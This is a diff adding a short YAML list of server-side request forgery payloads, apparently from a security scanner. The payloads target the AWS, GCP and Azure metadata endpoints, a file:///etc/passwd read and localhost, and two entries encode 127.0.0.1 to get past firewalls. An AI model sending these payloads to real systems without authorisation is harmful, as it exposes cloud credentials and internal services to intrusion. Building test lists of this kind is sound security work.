@@ -1,0 +1,31 @@
+﻿payloads:
+  - payload: "http://169.254.169.254/latest/meta-data/"
+    description: AWS IMDS v1 metadata
+    target: aws
+    severity: critical
+  - payload: "http://metadata.google.internal/computeMetadata/v1/"
+    description: GCP metadata (requires Metadata-Flavor header)
+    target: gcp
+    severity: critical
+  - payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    description: Azure metadata
+    target: azure
+    severity: critical
+  - payload: "file:///etc/passwd"
+    description: Local file read via file://
+    target: file_read
+    severity: high
+  - payload: "http://127.0.0.1/"
+    description: Localhost access via SSRF
+    target: internal
+    severity: high
+  - payload: "http://0177.0.0.1/"
+    description: 127.0.0.1 in octal bypass
+    target: bypass
+    severity: high
+    bypass_waf: true
+  - payload: "http://2130706433/"
+    description: 127.0.0.1 as integer bypass
+    target: bypass
+    severity: high
+    bypass_waf: true
